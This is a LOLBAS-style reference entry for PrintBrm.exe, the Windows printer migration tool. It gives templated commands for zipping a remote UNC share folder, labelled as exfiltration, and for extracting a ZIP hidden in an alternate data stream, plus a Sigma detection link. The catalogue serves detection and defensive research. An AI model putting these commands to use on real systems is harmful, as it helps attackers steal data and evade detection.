---
Acknowledgement:
- Person: Elliot Kill
Author: Elliot Killick
Commands:
- Category: Download
  Command: PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
  Description: Create a ZIP file from a folder in a remote drive
  MitreID: T1105
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Type: Compression
  Usecase: Exfiltrate the contents of a remote folder on a UNC share into a zip file
- Category: ADS
  Command: PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
  Description: Extract the contents of a ZIP file stored in an Alternate Data Stream
    (ADS) and store it in a folder
  MitreID: T1564.004
  OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Type: Compression
  Usecase: Decompress and extract a ZIP file stored on an alternate data stream to
    a new folder
Created: 2021-06-21
Description: Printer Migration Command-Line Tool
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml
- IOC: PrintBrm.exe should not be run on a normal workstation
Full_Path:
- Path: C:\Windows\System32\spool\tools\PrintBrm.exe
Name: PrintBrm.exe
Resources:
- Link: https://twitter.com/elliotkillick/status/1404117015447670800
mitre_data:
  technique_ids:
  - T1105
  - T1564.004
tags:
- lolbas/osbinaries
---

# PrintBrm.exe

Printer Migration Command-Line Tool

# Path(s)

- `C:\Windows\System32\spool\tools\PrintBrm.exe`

# ADS Commands

Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder

```batch
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
```

- **Usecase:** Decompress and extract a ZIP file stored on an alternate data stream to a new folder
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Download Commands

Create a ZIP file from a folder in a remote drive

```batch
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}
```

- **Usecase:** Exfiltrate the contents of a remote folder on a UNC share into a zip file
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://twitter.com/elliotkillick/status/1404117015447670800
# Acknowledgements

- Elliot Killick (Authored, 2021-06-21)
- Elliot Kill